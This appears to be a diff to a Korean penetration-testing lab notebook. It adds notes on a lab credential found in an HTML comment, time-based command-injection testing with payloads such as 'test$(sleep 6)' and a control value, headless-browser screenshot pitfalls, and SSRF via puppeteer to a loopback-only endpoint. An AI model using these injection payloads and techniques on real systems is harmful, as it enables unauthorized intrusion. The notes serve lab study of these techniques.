@@ -29,12 +29,12 @@ tags:
 - **A-3. 셸** — `A-31` 리버스셸이 안 붙는다 · `A-32` 진입점을 내 페이로드로 죽였다 · `A-33` 셸을 내 손으로 죽였다 — 인터랙티브 프롬프트와 `pkill -f` · `A-34` 셸이 수 초만 산다 — stdin 을 미리 채워 자동 실행시킨다 · `A-35` AMSI·Defender 가 페이로드를 조용히(또는 요란하게) 막는다 · `A-36` 제한 셸(rbash)에 떨어졌다 · `A-37` rbash 대상에 `scp` 가 조용히 끊긴다 · `A-38` `python3` 가 없어 TTY 업그레이드가 안 된다 · `A-39` 블라인드 RCE 는 되는데 셸이 안 붙는다 — 채널 제약(대소문자·길이·cwd)부터 계측한다 · `A-3-10` `su` 가 `must be run from a terminal` 로 거부된다 — 그러나 «항상» 그런 것은 아니다 · `A-3-11` Windows 셸에서 `whoami` 가 not recognized — 명령이 없는 게 아니라 PATH 가 없다 · `A-3-12` `event not found` — 히스토리 확장이 `!` 를 먹고 «줄 전체»를 폐기한다 · `A-3-13` Windows 웹셸을 대화형 셸로 올리는 세 경로 · `A-3-14` SSH 인증은 되는데 셸이 안 뜬다 — 강제 명령(`command=`)은 자기 자신을 정의하는 파일까지 막지 못한다 · `A-3-15` 익스플로잇은 성공했는데 셸이 «아무 메시지 없이» 안 붙는다 — 에그헌터면 egg 소실부터 · `A-3-16` Windows 원시 `nc` 셸에서는 Ctrl+C 가 셸을 죽인다 · `A-3-17` Windows 셸인데 Linux 반사로 치고 있다
 - **A-4. 권한상승** — `A-41` 셸은 잡았는데 권한상승 실마리가 없다 · `A-42` `find` / `ls` 가 영영 안 끝난다 · `A-43` `sudo -l` 이 좁아도 대상 파일 권한을 확인한다 · `A-44` 셸을 잡으면 `netstat -tulpn` 도 친다 · `A-45` 크론이 안 보인다 / `find` 가 정답을 잘랐다 · `A-46` 다단계 익스플로잇은 각 단계를 «따로» 검증한다 · `A-47` 권한상승 도구가 «내» 계정 비밀번호까지 갈아치운다 · `A-48` RDP 로 붙었는데 트레이 아이콘이 없다 — 세션 토폴로지부터 잰다 · `A-49` 헤드리스에서 `The operation was canceled by the user` — 내가 취소한 게 아니다 · `A-4-10` 디스크에 남은 PowerShell transcript 가 관리자 스크립트를 가리킨다 · `A-4-11` 권한상승 페이로드에 «다른 박스»의 사용자명·`>` 덮어쓰기가 섞여 들어온다 · `A-4-12` 범용 로컬 권한상승 CVE 는 «5개 반사 명령 뒤»에 던진다 · `A-4-13` root 는 잡았는데 `cat` 이 «조용히» 아무것도 안 뱉는다 — 오염된 PATH 가 상속됨 · `A-4-14` sudo 로 스크립트를 실행했는데 프롬프트가 안 돌아온다 — 페이로드 «위치»가 틀렸다 · `A-4-15` 관리자 그룹에 넣었는데 `whoami /priv` 가 초라하다 — UAC 원격 토큰 필터링 · `A-4-16` GTFOBins 로 띄운 root 셸이 즉시 죽는다 · `A-4-17` Windows 셸을 잡았는데 어느 특권을 써야 할지 모르겠다 — 던지기 전에 3초·10초 판정으로 후보를 지운다 · `A-4-18` sudo NOPASSWD 대상이 GTFOBins 에 없다 — 「이 프로그램이 뭘 하는가」로 사고한다
 - **A-5. Active Directory** — `A-51` AD 박스에서 막히면 «취약점»이 아니라 넷을 먼저 본다 · `A-52` 자격증명은 맞는데 «어떤 대화형 서비스도» 로그인을 안 받는다 · `A-53` DC 에서 `whoami` 가 SYSTEM 이 아니라 `DOMAIN\HOST$` 로 나온다 — 실패가 아님 · `A-54` 강제 인증 해시는 잡았는데 릴레이가 안 통한다 — 릴레이 가능 여부는 3초에 판정한다
-- **A-6. 판단·검증 (메타)** — `A-61` 관측은 맞는데 결론이 어긋난다 · `A-62` 원복 검증이 «엉뚱한 파일»을 봤다 · `A-63` 익스플로잇은 통했는데 «무엇을 보냈는지» 기록이 없다 · `A-64` 사후에 시간 서사를 복원하는 법 — mtime + 스크린샷 파일명 · `A-65` 리버트되면 IP 가 바뀐다 — 노트의 IP 에는 «어느 세션»인지를 붙인다 · `A-66` 조건을 바꾸는데 응답이 한 글자도 안 변한다 · `A-67` blind 추출 결과를 믿기 전에 «완주했는가»부터 본다 · `A-68` 작업이 «끊긴» 것을 실패로 적지 말 것 — 그리고 랩 측 티어다운은 게이트웨이 핑으로 확정한다 · `A-69` 산출물을 「정리」하다 실패의 증거를 지웠다 · `A-6-10` 도구를 `~/git/` 에서 직접 실행하는 습관이 매번 경로·아키텍처 탐색 비용을 만든다 · `A-6-11` 박스 이름·호스트명이 증거 사슬을 대신하면 시험장에서 무너진다 · `A-6-12` 같은 파일의 플래그를 두 번 읽었는데 값이 다르다 · `A-6-13` 도구가 `Unknown argument error` 만 뱉고 어느 인자가 틀렸는지 안 알려준다 · `A-6-14` 내가 찾아본 곳에 없다 ≠ 존재하지 않는다 — 부재 증거를 존재 부정으로 승격시키지 않는다
+- **A-6. 판단·검증 (메타)** — `A-61` 관측은 맞는데 결론이 어긋난다 · `A-62` 원복 검증이 «엉뚱한 파일»을 봤다 · `A-63` 익스플로잇은 통했는데 «무엇을 보냈는지» 기록이 없다 · `A-64` 사후에 시간 서사를 복원하는 법 — mtime + 스크린샷 파일명 · `A-65` 리버트되면 IP 가 바뀐다 — 노트의 IP 에는 «어느 세션»인지를 붙인다 · `A-66` 조건을 바꾸는데 응답이 한 글자도 안 변한다 · `A-67` blind 추출 결과를 믿기 전에 «완주했는가»부터 본다 · `A-68` 작업이 «끊긴» 것을 실패로 적지 말 것 — 그리고 랩 측 티어다운은 게이트웨이 핑으로 확정한다 · `A-69` 산출물을 「정리」하다 실패의 증거를 지웠다 · `A-6-10` 도구를 `~/git/` 에서 직접 실행하는 습관이 매번 경로·아키텍처 탐색 비용을 만든다 · `A-6-11` 박스 이름·호스트명이 증거 사슬을 대신하면 시험장에서 무너진다 · `A-6-12` 같은 파일의 플래그를 두 번 읽었는데 값이 다르다 · `A-6-13` 도구가 `Unknown argument error` 만 뱉고 어느 인자가 틀렸는지 안 알려준다 · `A-6-14` 내가 찾아본 곳에 없다 ≠ 존재하지 않는다 — 부재 증거를 존재 부정으로 승격시키지 않는다 · `A-6-15` 명령을 넣었는데 출력이 없다 — 지연으로 판정하기 전에 대조군을 잰다 · `A-6-16` 스크린샷이 나왔는데 그 안에 대상이 없다
 
 **B. 기법 카드 — 이 서비스를 봤을 때**
-- **B-1. 웹** — `B-11` SSTI (Jinja2 / Flask) · `B-12` SQLi 수동 UNION — sqlmap 금지 대비 · `B-13` disable_functions 우회 (PHP) · `B-14` traversal 을 손으로 칠 때 `--path-as-is` · `B-15` 헤더 기반 IP 접근제어 우회 · `B-16` XPath injection · `B-17` Symfony dev 프론트컨트롤러 → `_fragment` 서명 위조 RCE · `B-18` 번들 서드파티 컴포넌트가 진짜 취약점이다 · `B-19` Rails 매스어사인먼트 (strong parameters) · `B-1-10` ZoneMinder 무인증 콘솔 + Filter AutoExecuteCmd RCE · `B-1-11` 후보 파라미터 이름은 배치로 쏜다 — 대조군 필수 · `B-1-12` PHP 언어파일(`.lng`)은 «실행되는 코드»다 · `B-1-13` 입력 필터는 «위치별»로 때려본다 · `B-1-14` CSRF 벽은 토큰을 실시간 파싱해 넘는다 · `B-1-15` GraphQL introspection → 인자 주입 · `B-1-16` CLI 인자 주입(argument injection) — 웹 값이 argv 로 흘러가는 자리 · `B-1-17` 정적 템플릿 사이트에서 «손댄 문단»은 자격증명 힌트다 · `B-1-18` SVG 아이콘 캡차는 `path` 데이터로 연산자를 판정한다 · `B-1-19` `LIKE '%…%'` 로 짠 로그인 쿼리는 그 자체가 인증 우회다 · `B-1-20` 검증하는 파서 ≠ 처리하는 파서 — 업로드 필터는 그 틈으로 넘는다 · `B-1-21` 노출된 소스를 «먼저» 확보한다 — 화이트박스가 블랙박스보다 압도적으로 빠르다 · `B-1-22` Nextcloud · ownCloud 를 만나면 WebDAV 를 직접 때린다 · `B-1-23` 문서 변환기(HTML→PDF)는 서버측 파서다 — mPDF `<annotation>` 임의 파일 읽기 · `B-1-24` Webmin package-updates 인증 후 RCE — CVE-2022-36446 · `B-1-25` time-based blind SQLi 를 손으로 짠다 — sqlmap 금지 대비 · `B-1-26` 경로 트래버설은 「파일 경로 조립」의 문제다 — 방어 지점 3곳과 Go `filepath.Join` 함정 · `B-1-27` 임의 파일 읽기를 확보했다 — 무엇을 읽을 것인가 · `B-1-28` Go 서비스를 만나면 `/debug/pprof/` 부터 · `B-1-29` 제품별 비인증 버전 엔드포인트 — 열거 시간을 5분에서 30초로 · `B-1-30` PHP 스트림 래퍼로 LFI 를 RCE 로 확장 · `B-1-31` 업로드 파일명이 `time()` 기반이면 브루트로 뚫린다 · `B-1-32` CMS 사용자명 «무료» 열거는 브루트포스 탐색공간을 두 자릿수로 줄인다 · `B-1-33` XXE (XML External Entity) — DTD·엔티티 배경과 판단 절차 · `B-1-34` Grafana 트래버설 → 설정·DB 탈취 → 복호화 체인에서 막히는 지점 · `B-1-35` Apache APISIX — batch-requests 로 Admin API 우회 → 라우트 `filter_func` Lua RCE (CVE-2022-24112) · `B-1-36` 인증 후 파일 업로드 → RCE — 조건 셋과 업로드 경로 찾기 · `B-1-37` 로그인 폼을 만나면 기본 자격증명이 1순위 — 제품별 기본값 표 · `B-1-38` LFI 진입점이 한 앱에 «두 개» 있을 수 있다 — 하나는 소스 전용, 하나는 실행 가능 · `B-1-39` 인터프리터에 사용자 문자열이 들어가면 RCE 다 — js2py `pyimport`(CVE-2023-0297) · `B-1-40` 관리 화면이 렌더한 «경로»가 실행 계정을 말해준다 — 권한상승 유무를 익스플로잇 전에 안다 · `B-1-41` 개발 서버 배너를 보면 dirbust 대신 «일부러 500» · `B-1-42` IIS · ASP.NET — 실행·거부 확장자 뒤에 «정적 확장자»를 덧붙인다 · `B-1-43` 수동 MSSQL SQLi 절차 — sqlmap 금지 대비 · `B-1-44` PHP 객체 역직렬화(PHP Object Injection) + phpggc · `B-1-45` Next.js 미들웨어 인가 우회 (CVE-2025-29927) — 그리고 앞단 인가 우회 6벡터 · `B-1-46` Tomcat CVE-2017-12617 — PUT + 트레일링 슬래시로 확장자 매퍼 우회 (JSP 업로드 RCE) · `B-1-47` 설정 마법사가 미완료면 관리자 계정을 «선점»할 수 있다 · `B-1-48` 임의 파일 «쓰기»를 확보했다 — 무엇에 쓸 것인가 · `B-1-49` 경로 패턴이 웹서버 종류를 말해준다 — `/goform/` 은 임베디드 C 핸들러다 · `B-1-50` Atlassian Confluence CVE-2022-26134 — URI 경로 OGNL 주입 (미인증 RCE) · `B-1-51` BinaryFormatter 계열 역직렬화가 왜 RCE 인가 · `B-1-52` 문자열로 함수를 고르는 디스패처는 「막는 목록」인지 「통과시키는 목록」인지 본다
+- **B-1. 웹** — `B-11` SSTI (Jinja2 / Flask) · `B-12` SQLi 수동 UNION — sqlmap 금지 대비 · `B-13` disable_functions 우회 (PHP) · `B-14` traversal 을 손으로 칠 때 `--path-as-is` · `B-15` 헤더 기반 IP 접근제어 우회 · `B-16` XPath injection · `B-17` Symfony dev 프론트컨트롤러 → `_fragment` 서명 위조 RCE · `B-18` 번들 서드파티 컴포넌트가 진짜 취약점이다 · `B-19` Rails 매스어사인먼트 (strong parameters) · `B-1-10` ZoneMinder 무인증 콘솔 + Filter AutoExecuteCmd RCE · `B-1-11` 후보 파라미터 이름은 배치로 쏜다 — 대조군 필수 · `B-1-12` PHP 언어파일(`.lng`)은 «실행되는 코드»다 · `B-1-13` 입력 필터는 «위치별»로 때려본다 · `B-1-14` CSRF 벽은 토큰을 실시간 파싱해 넘는다 · `B-1-15` GraphQL introspection → 인자 주입 · `B-1-16` CLI 인자 주입(argument injection) — 웹 값이 argv 로 흘러가는 자리 · `B-1-17` 정적 템플릿 사이트에서 «손댄 문단»은 자격증명 힌트다 · `B-1-18` SVG 아이콘 캡차는 `path` 데이터로 연산자를 판정한다 · `B-1-19` `LIKE '%…%'` 로 짠 로그인 쿼리는 그 자체가 인증 우회다 · `B-1-20` 검증하는 파서 ≠ 처리하는 파서 — 업로드 필터는 그 틈으로 넘는다 · `B-1-21` 노출된 소스를 «먼저» 확보한다 — 화이트박스가 블랙박스보다 압도적으로 빠르다 · `B-1-22` Nextcloud · ownCloud 를 만나면 WebDAV 를 직접 때린다 · `B-1-23` 문서 변환기(HTML→PDF)는 서버측 파서다 — mPDF `<annotation>` 임의 파일 읽기 · `B-1-24` Webmin package-updates 인증 후 RCE — CVE-2022-36446 · `B-1-25` time-based blind SQLi 를 손으로 짠다 — sqlmap 금지 대비 · `B-1-26` 경로 트래버설은 「파일 경로 조립」의 문제다 — 방어 지점 3곳과 Go `filepath.Join` 함정 · `B-1-27` 임의 파일 읽기를 확보했다 — 무엇을 읽을 것인가 · `B-1-28` Go 서비스를 만나면 `/debug/pprof/` 부터 · `B-1-29` 제품별 비인증 버전 엔드포인트 — 열거 시간을 5분에서 30초로 · `B-1-30` PHP 스트림 래퍼로 LFI 를 RCE 로 확장 · `B-1-31` 업로드 파일명이 `time()` 기반이면 브루트로 뚫린다 · `B-1-32` CMS 사용자명 «무료» 열거는 브루트포스 탐색공간을 두 자릿수로 줄인다 · `B-1-33` XXE (XML External Entity) — DTD·엔티티 배경과 판단 절차 · `B-1-34` Grafana 트래버설 → 설정·DB 탈취 → 복호화 체인에서 막히는 지점 · `B-1-35` Apache APISIX — batch-requests 로 Admin API 우회 → 라우트 `filter_func` Lua RCE (CVE-2022-24112) · `B-1-36` 인증 후 파일 업로드 → RCE — 조건 셋과 업로드 경로 찾기 · `B-1-37` 로그인 폼을 만나면 기본 자격증명이 1순위 — 제품별 기본값 표 · `B-1-38` LFI 진입점이 한 앱에 «두 개» 있을 수 있다 — 하나는 소스 전용, 하나는 실행 가능 · `B-1-39` 인터프리터에 사용자 문자열이 들어가면 RCE 다 — js2py `pyimport`(CVE-2023-0297) · `B-1-40` 관리 화면이 렌더한 «경로»가 실행 계정을 말해준다 — 권한상승 유무를 익스플로잇 전에 안다 · `B-1-41` 개발 서버 배너를 보면 dirbust 대신 «일부러 500» · `B-1-42` IIS · ASP.NET — 실행·거부 확장자 뒤에 «정적 확장자»를 덧붙인다 · `B-1-43` 수동 MSSQL SQLi 절차 — sqlmap 금지 대비 · `B-1-44` PHP 객체 역직렬화(PHP Object Injection) + phpggc · `B-1-45` Next.js 미들웨어 인가 우회 (CVE-2025-29927) — 그리고 앞단 인가 우회 6벡터 · `B-1-46` Tomcat CVE-2017-12617 — PUT + 트레일링 슬래시로 확장자 매퍼 우회 (JSP 업로드 RCE) · `B-1-47` 설정 마법사가 미완료면 관리자 계정을 «선점»할 수 있다 · `B-1-48` 임의 파일 «쓰기»를 확보했다 — 무엇에 쓸 것인가 · `B-1-49` 경로 패턴이 웹서버 종류를 말해준다 — `/goform/` 은 임베디드 C 핸들러다 · `B-1-50` Atlassian Confluence CVE-2022-26134 — URI 경로 OGNL 주입 (미인증 RCE) · `B-1-51` BinaryFormatter 계열 역직렬화가 왜 RCE 인가 · `B-1-52` 문자열로 함수를 고르는 디스패처는 「막는 목록」인지 「통과시키는 목록」인지 본다 · `B-1-53` Flask 정적 서버의 루트가 홈 디렉터리다 — `static_folder` 를 소스에서 확인한다 · `B-1-54` blind 요청은 «콜백»으로 읽고, Content-Type × 파라미터명을 «한 판»에 쏜다
 - **B-2. 네트워크 서비스** — `B-21` ProFTPd + mod_sql_mysql — 계정이 DB 행 하나다 · `B-22` Gogs / Gitea — Git Hooks 는 «설계된» RCE 다 · `B-23` OpenSMTPD MAIL FROM 로컬파트 검증 우회 — CVE-2020-7247 · `B-24` 커널 익스플로잇은 «한 발»이다 — 재시도가 스스로 문을 닫는다 · `B-25` 무인증 Redis = 임의 파일 쓰기 = RCE · `B-26` Remote Mouse 계열 원격제어 앱 — 키입력 주입으로 RCE (CVE-2022-3365 · EDB 46697) · `B-27` 익명으로 열리는 SMB 공유 — `path` 가 웹루트인지부터 본다 · `B-28` `enum4linux -U` 가 비면 `rpcclient` 로 `S-1-22-1-<uid>` 를 역조회한다 · `B-29` FTP 로그인은 되는데 `LIST` 가 멈춘다 — PASV 를 의심한다 · `B-2-10` 확장자 없는 백업 파일은 `file` 부터 — pcap 이면 그것이 정찰 자료다 · `B-2-11` clamav-milter black-hole 모드 RCPT TO 명령 주입 — CVE-2007-4560 · `B-2-12` 번들 스택의 구성요소가 «돈다»고 가정하지 말 것 · `B-2-13` POP3 · IMAP (110 · 143) — 메일함은 셸이 아니라 «다음 자격증명이 평문으로 적혀 있는 곳»이다 · `B-2-14` H2 Database Console — 콘솔 접속 = 코드 실행 (CSVWRITE + CREATE ALIAS + JNI) · `B-2-15` 모르는 서비스를 만났을 때의 절차 — ZooKeeper 4자 명령이 그 표본 · `B-2-16` .NET Remoting 은 그 자체로 무인증 역직렬화 엔드포인트다 · `B-2-17` ftp-anon 을 보면 «먼저» 통째로 받는다 · `B-2-18` nmap `SERVICE` 열은 «전송 계층» 이름일 수 있다 — 첫 검색어는 포트 번호 · `B-2-19` 루프백에 열린 무인증 JMX 는 그 자체로 권한상승 후보다
-- **B-3. 리눅스 권한상승** — `B-31` 크론 기반 권한상승 · `B-32` SUID 바이너리 명령주입 — 문자 필터는 `$()` 로 넘는다 · `B-33` SUID 셸로 스크립트를 넘기면 euid 가 날아간다 (dash) · `B-34` root 로 도는 서비스의 «쓰기 가능한» 경로 = 권한상승 · `B-35` `find -exec sh -c '... {}'` 는 파일명 인젝션이다 · `B-36` SUID `find` 는 그 자체로 root — `-p` 를 빠뜨리면 실패한다 · `B-37` `/etc/shadow` 행 선삽입 — `getspnam()` first-match · `B-38` `sudo -l` 규칙 끝의 `*` 읽는 법 — 그리고 `tar` 체크포인트 · `B-39` 와일드카드 인젝션 — 도구별 벡터 · `B-3-10` `disk` 그룹 = root, 그리고 `debugfs` 사용법 · `B-3-11` MOTD 권한상승 — `/etc/update-motd.d/` 는 SSH 로그인마다 root 로 돈다 · `B-3-12` SUID 가 절대경로 없이 외부 명령을 부르면 PATH 하이재킹이 된다 · `B-3-13` Go 정적 SUID 바이너리는 `strings` 가 아니라 «심볼»로 읽는다 · `B-3-14` sudo `service` — 인자가 «경로에 이어붙는» 프로그램은 전부 탈출구다 · `B-3-15` 코어 덤프에서 평문 자격증명 추출 — `sudo -l` 을 4가지 질문으로 판정하는 법 · `B-3-16` getcap 결과에서 노이즈와 후보를 가른다 — GTFOBins 원문이 정확히 그 최대치다 · `B-3-17` `/etc/passwd` 에 심을 crypt 해시 만들기 — `openssl passwd` 가 가장 안전한 선택
+- **B-3. 리눅스 권한상승** — `B-31` 크론 기반 권한상승 · `B-32` SUID 바이너리 명령주입 — 문자 필터는 `$()` 로 넘는다 · `B-33` SUID 셸로 스크립트를 넘기면 euid 가 날아간다 (dash) · `B-34` root 로 도는 서비스의 «쓰기 가능한» 경로 = 권한상승 · `B-35` `find -exec sh -c '... {}'` 는 파일명 인젝션이다 · `B-36` SUID `find` 는 그 자체로 root — `-p` 를 빠뜨리면 실패한다 · `B-37` `/etc/shadow` 행 선삽입 — `getspnam()` first-match · `B-38` `sudo -l` 규칙 끝의 `*` 읽는 법 — 그리고 `tar` 체크포인트 · `B-39` 와일드카드 인젝션 — 도구별 벡터 · `B-3-10` `disk` 그룹 = root, 그리고 `debugfs` 사용법 · `B-3-11` MOTD 권한상승 — `/etc/update-motd.d/` 는 SSH 로그인마다 root 로 돈다 · `B-3-12` SUID 가 절대경로 없이 외부 명령을 부르면 PATH 하이재킹이 된다 · `B-3-13` Go 정적 SUID 바이너리는 `strings` 가 아니라 «심볼»로 읽는다 · `B-3-14` sudo `service` — 인자가 «경로에 이어붙는» 프로그램은 전부 탈출구다 · `B-3-15` 코어 덤프에서 평문 자격증명 추출 — `sudo -l` 을 4가지 질문으로 판정하는 법 · `B-3-16` getcap 결과에서 노이즈와 후보를 가른다 — GTFOBins 원문이 정확히 그 최대치다 · `B-3-17` `/etc/passwd` 에 심을 crypt 해시 만들기 — `openssl passwd` 가 가장 안전한 선택 · `B-3-18` SUID 바이너리의 인접 스택 변수를 덮어 실행 경로를 바꾼다 — 셸코드·ROP 불요
 - **B-4. 윈도우 권한상승** — `B-41` AlwaysInstallElevated (Windows) · `B-42` 특권은 "없는" 게 아니라 "박탈된" 것일 수 있다 · `B-43` Windows Sticky Notes 는 자격증명 저장소다 · `B-44` unquoted service path 를 봤을 때 잴 것은 «공백»이 아니라 `icacls` 의 `(AD)`·`(IO)` · `B-45` GUI 파일 대화상자 → 상위 권한 cmd · `B-46` `SeImpersonatePrivilege : Enabled` + Spooler 생존 → PrintSpoofer · `B-47` SeRestorePrivilege — SYSTEM 으로 가는 두 갈래(파일 / 레지스트리)와 그 전제조건 · `B-48` `SeDebugPrivilege` 는 그 자체로 SYSTEM 상승 경로다
 - **B-5. Active Directory** — `B-51` «사용자 설명 필드»는 AD 의 자격증명 저장소다 · `B-52` 실패 표시가 실패를 뜻하지 않는다 — NTLM 상태 코드를 읽는다 · `B-53` 유효한 도메인 자격증명 «하나»를 얻으면 즉시 BloodHound를 돌린다 · `B-54` DC 컴퓨터 객체에 붙은 저권한 ACE는 곧 도메인 장악이다 · `B-55` 웹 정찰이 곧 스프레이 재료다 — 실명은 계정명, 저작권 연도는 비밀번호 후보 · `B-56` Kerberoast 로 깬 비밀번호가 로그인이 안 되면 «티켓 재료»로 쓴다 · `B-57` 쓰기 가능한 SMB 공유는 저장소가 아니라 «자격증명 덫»이다 — 강제 인증 · `B-58` GPO 쓰기 권한 = 그 GPO 가 적용되는 모든 머신에서 SYSTEM · `B-59` gMSA — 크랙할 수 없지만 읽을 수는 있는 계정
 - **B-6. 자격증명·크래킹** — `B-61` 개인키의 주석은 소유자가 아니다 · `B-62` 자격증명은 인증 DB 가 아니라 «애플리케이션 데이터» 에 있다 · `B-63` sha512crypt 를 보고 접지 마라 — rockyou 완주에도 안 깨지면 그때 접는다 · `B-64` Windows 설정 파일 자격증명 사냥 — 그리고 그 암호의 «주인»을 먼저 확정한다 · `B-65` hydra·cewl 실무 함정 — `-c` 파일 형식과 `hydra.restore` · `B-66` 해시 접두어로 포맷을 즉시 판별한다 · `B-67` 해시 vs 가역 암호화 — 시간 배분을 결정하는 구분 · `B-68` salt · IV · ciphertext 연접 포맷 — 애플리케이션 자체 암호화의 사실상 표준 · `B-69` 설정 파일에서 «주석 처리된» 항목 = 「그 값이 기본값」이라는 문서 · `B-6-10` 사이트 콘텐츠 기반 자체 사전이 rockyou 를 이긴다 · `B-6-11` 솔트 없는 MD5 덤프 — 초 단위에 풀리고, 사용자 짝은 «따로» 되살려야 한다 · `B-6-12` 평문 비밀번호를 하나 주우면 「이 조직이 쓰는 비밀번호」로 취급한다
@@ -707,6 +707,10 @@ curl -s -o /dev/null -w "%{http_code}\n" http://TARGET:PORT/nonexistent-abc123
 ```
 — 출처: `~/PG/PlanetExpress/gobuster.log` · `config.yml`
 → **열거로 «읽히는 파일»을 확보했으면 끝까지 읽을 것.** 주석은 「그 값이 기본값」이라는 문서이자(B-69) 「그 경로가 실재한다」는 목록임. 브루트를 한 시간 더 돌리는 것보다 설정 파일 한 개를 눈으로 읽는 것이 쌈.
+
+**같은 함정의 최단 판본 — 자격증명이 관리 경로의 HTML 주석에 «평문»으로 박혀 있음.** [[JISCTF]] 실측: `robots.txt` 가 가리킨 `/admin_area/` 의 렌더 화면은 `The admin area not work :)` 한 줄뿐이라 **화면만 보면 막다른 길**임. 실제로는 응답 본문 주석에 `admin / 3v1l_H@ck3r` 이 들어 있었고 그것이 유일한 진입 자격증명이었음.
+→ **「빈 페이지·공사중·에러 문구」야말로 원문을 봐야 할 신호임.** 렌더 결과가 초라할수록 브라우저가 숨긴 양이 큼. 순서는 **열거 → 소스·주석·`robots.txt` → 그다음이 자격증명**임(A-25 · B-1-17).
+⚠️ **`view-source:` 스킴은 헤드리스 크로미움이 열지 못함** — 새 탭이 대신 찍힘. 주석 확인은 브라우저가 아니라 `curl` 응답 본문으로 할 것(C-4).
 
 **정적 서빙이 «없는» 프레임워크에서는 워드리스트가 원리적으로 0건임 — 30초짜리 판정을 먼저 할 것.** Sinatra(classic)·Flask 는 `public/` 을 명시하지 않으면 정적 파일을 아예 안 줌. 정의된 라우트 외에는 쳐다보지도 않으므로 404 만 쌓임.
 
@@ -4147,6 +4151,49 @@ whatweb http://192.168.243.63:450 > whatweb.txt   # ← 정정
 **목록 밖으로 나가지 말 것.** 여기에 없으면 등급은 `근거부족` 이고 판정을 보류하는 것이 정답임.
 → **반대 방향도 같은 규율임 — 작성할 때도.** 하지 않은 대조를 근거로 세우지 말고, 한 대조는 **재현 절차와 함께** 적을 것. 결론만 적힌 관측은 나중에 스스로도 증명하지 못함(A-63 · A-64).
 
+#### A-6-15. 명령을 넣었는데 출력이 없다 — 지연으로 판정하기 전에 대조군을 잰다
+
+- **증상** — 인젝션 후보를 넣었는데 응답 본문에 명령 출력 부재. 응답 코드만 갈림
+- **판정 불가 지점** — 응답 분기는 실행 여부의 근거 부재
+
+```text
+PAYLOAD: test;id
+Internal Server Error
+
+PAYLOAD: test`id`
+Created backup: /var/log/app/logfile-test`id`.gz
+
+PAYLOAD: test$(id)
+Created backup: /var/log/app/logfile-test$(id).gz
+```
+출처: `~/PG/Interface/inj/try_1.txt`~`try_3.txt`
+
+- 500 과 200 으로 갈리지만 어느 쪽에도 `id` 출력 부재. 「Created backup」 200 은 파일명 문자열이 통과한 것이지 명령 치환이 실행된 근거 부재
+- **다음 수** — 응답 코드가 아니라 시간차. 단 지연 페이로드 하나만 재는 것은 근거 부재. **명령 치환이 들어 있지 «않은» 대조군을 같은 배치로 함께 발사할 것**
+
+```text
+[test$(sleep 6)] 6294ms :: Created backup: /var/log/app/logfile-test$(sleep 6).gz
+[test`sleep 6`] 6283ms :: Created backup: /var/log/app/logfile-test`sleep 6`.gz
+[test$IFS] 272ms :: Created backup: /var/log/app/logfile-test$IFS.gz
+```
+출처: `~/PG/Interface/inj/timing.txt`
+
+- **판정 기준** — 지연 6,294ms·6,283ms 대 대조군 272ms. **차이가 주입한 `sleep` 값과 일치**해야 성립. 대조군 부재 시 그 6초가 네트워크·서버 부하인지 명령 실행인지 구분 불가
+- **대조군 고르는 법** — 구문은 통과하되 명령 치환이 부재한 값. `$IFS` 는 셸 변수라 파싱만 되고 실행은 부재
+- **금지 도구** — `sqlmap` 계열은 시험 금지. 시간 기반 판정은 손으로 짤 것(SQL 판은 B-1-25, 배치 사격의 대조군 규율은 B-1-11)
+
+#### A-6-16. 스크린샷이 나왔는데 그 안에 대상이 없다
+
+- **증상** — 헤드리스 캡처가 성공을 보고하고 PNG 크기도 그럴듯한데, 열어 보면 대상 화면 부재
+- **실측**(JISCTF, 노트 미작성) — `chromium --headless --screenshot=… view-source:http://…/admin_area/` 가 view-source 스킴 열기에 실패
+  - 실제로 찍힌 것은 **Chromium 새 탭 화면**. 35,875 B PNG 로 저장되어 증거로 쓸 뻔한 뒤 삭제(원문 미보존)
+  - 출처: `~/PG/JISCTF/writeup_notes.txt`
+- **판정 기준 — 파일 크기는 성공의 증거 부재.** 빈 새 탭도 수십 KB. **찍은 PNG 를 반드시 열어 무엇이 찍혔는지 확인할 것**
+- **헤드리스가 못 여는 것** — `view-source:` 스킴. 소스는 화면이 아니라 `curl` 응답 본문으로 남길 것. HTML 주석 안의 자격증명은 애초 렌더 화면에 부재
+- **인증 후 화면** — `chromium --headless` 는 쿠키 주입 불가. `QT_QPA_PLATFORM=offscreen cutycapt --header='Cookie:PHPSESSID=…' --url=… --out=….png` 로 우회
+  - `QT_QPA_PLATFORM=offscreen` 부재 시 `could not connect to display` 로 종료
+  - 산출물 실측 — `~/PG/JISCTF/shot_80_upload_authenticated.png`(142,583 B)
+
 ## B. 기법 카드 — 이 서비스를 봤을 때
 
 ### B-1. 웹
@@ -4424,6 +4471,8 @@ curl -s -H "X-Forwarded-For: 10.10.10.1" http://<타겟>/login.php
 - 결과 — 원격 요청이 백엔드에 도달할 때 `REMOTE_ADDR = "127.0.0.1"`. **보안 검사와 그것을 우회시키는 기능이 같은 제품 안에 기본값으로 공존함**
 
 → **판정 기준은 하나 — 이 검사가 출발지 IP 를 믿는다면 «그 IP 를 바꿔줄 중간 홉»이 있는지 찾을 것.** 있으면 검사는 없는 것임. 리버스 프록시·로드밸런서·Kubernetes Service·SSRF 가 전부 같은 효과를 냄. [[Squid]] 의 오픈 프록시가 같은 구조인데 거기서는 **공격자가** 프록시를 이용했고 여기서는 **앱이** 프록시를 제공함.
+
+**중간 홉이 «헤드리스 브라우저»면 그것도 같은 효과임 — 게다가 자바스크립트를 얹어 보낼 수 있음.** [[AdminPanel]] 은 `/open-url` 이 puppeteer 로 임의 http(s) URL 을 열어줬고, 그 브라우저가 대상 자신에서 돌아 루프백 전용 `/exec`(`remoteAddress` 검사)를 그대로 통과함. 프록시·batch 와 다른 점은 **공격자가 보낸 페이지의 스크립트가 하위 요청을 «구성»한다**는 것 — 즉 SSRF 가 브라우저 안의 CSRF 로 이어짐. 응답을 못 읽는 대신 Content-Type 선택과 콜백 판정이 필요해짐(B-1-54).
 
 **⛔ `or` 로 묶인 접근제어는 가장 약한 가지만큼만 강함.** `HTTP_HOST` 는 클라이언트가 보낸 `Host:` 헤더이므로 전적으로 우리 통제 아래 있음. **프록시가 없어 `REMOTE_ADDR` 이 우리 IP 로 남아도 헤더 한 줄로 두 번째 가지를 만족시킴:**
 ```bash
@@ -5952,6 +6001,84 @@ Ruby    send(params[:method])                    ← Rails
